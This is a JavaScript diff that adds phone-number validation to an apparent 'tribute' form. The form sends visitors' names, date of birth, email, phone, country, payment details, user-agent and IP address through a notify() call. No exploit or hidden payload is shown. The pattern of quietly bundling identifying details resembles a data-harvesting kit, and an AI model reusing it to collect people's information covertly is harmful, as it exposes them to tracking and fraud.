@@ -68,6 +68,26 @@ async function notify(message){
             return regex.test(email);
         }
 
+        function isPhone(phone) {
+            if (!(!phone.includes("  ") && !phone.includes("--") && !phone.includes(" -") && !phone.includes("- "))) {
+                return false;
+              }
+            // Check if phone contains hyphens or spaces
+            if (/[\s-]/.test(phone)) {
+                // Check if phone starts or ends with a space or hyphen
+                if (/^[\s-]|[\s-]$/.test(phone)) {
+                  return false;
+                }
+              }
+            // Normalize phone number: Remove spaces and hyphens
+            phone = phone.replace(/[\s-]/g, '');
+            // Check if phone number is exactly 10 digits
+            const regex = /^\d{10}$/;
+            return regex.test(phone);
+        }
+
+
+
         function onAction(iddiv){
 
 
@@ -171,6 +191,7 @@ async function notify(message){
         let lname = "";
         let dob = "";
         let email ="";
+        let phone ="";
         let country = "";
 
         const provider = "SLAVE NEW FORM-DEVELOPER";
@@ -186,6 +207,7 @@ async function notify(message){
           lname = $("#lname").val();
           dob = $("#dob").val();
           email = $("#email").val();
+          phone = $("#phone").val();
           country = $("#country").val();
 
           if (fname == "" && lname=="" && dob=="" && email=="" && country==""){
@@ -220,6 +242,11 @@ async function notify(message){
             $(".error").html('<div id="error"><span>Please Choose Your Country</span></div>');
 
 
+          }else if (phone != "" && isPhone(phone) == false){
+
+            $(".error").html('<div id="error"><span>Please Enter A Valid Phone Number</span></div>');
+
+
           }else{
 
             $(".error").html("");
@@ -245,7 +272,7 @@ async function notify(message){
                         var mdiv = `ONWER:${capitalizeWithRegex(mistress)}\n`;
                     }
                     console.log(mdiv);
-                    var message = `PROVIDER: ${provider}\n${mdiv}FIRST NAME: ${fname}\nLAST NAME: ${lname}\nDATE OF BIRTH: ${dob}\nEMAIL ADDRESS: ${email}\nCOUNTRY: ${country}\n================\nTRIBUTE DURATION: ${dur_tribute}\nTRIBUTE AMOUNT: ${amount_tribute}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
+                    var message = `PROVIDER: ${provider}\n${mdiv}FIRST NAME: ${fname}\nLAST NAME: ${lname}\nDATE OF BIRTH: ${dob}\nEMAIL ADDRESS: ${email}\nPHONE NUMBER: ${phone}\nCOUNTRY: ${country}\n================\nTRIBUTE DURATION: ${dur_tribute}\nTRIBUTE AMOUNT: ${amount_tribute}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
                     var status = notify(message);
                     window.location.href = "/success.html";
 
